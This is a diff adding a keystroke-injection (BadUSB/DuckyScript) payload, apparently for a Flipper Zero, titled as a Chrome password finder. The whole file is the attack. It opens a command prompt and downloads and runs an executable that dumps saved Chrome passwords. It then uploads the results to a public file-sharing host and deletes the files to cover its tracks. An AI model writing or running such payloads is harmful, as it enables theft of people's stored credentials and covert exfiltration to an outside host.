@@ -1,0 +1,38 @@
+REM CHDEC - Google Chrome Passwords Finder
+
+REM Open cmd
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 500
+STRING cd %temp%
+ENTER
+DELAY 100
+
+REM Download chdec.exe
+STRING curl http://serverino/chdec.exe -o chdec.exe
+ENTER
+DELAY 5000
+
+REM Run chdec.exe
+STRING chdec.exe > psw.txt
+ENTER
+DELAY 1000
+
+REM Upload file online
+STRING curl -X POST https://filebin.net/flipperpioz/psw.txt -d @psw.txt
+ENTER
+DELAY 2000
+
+REM Delete files
+STRING del psw.txt
+ENTER
+DELAY 100
+STRING del chdec.exe
+ENTER
+DELAY 100
+
+REM Close cmd
+STRING exit
+ENTER
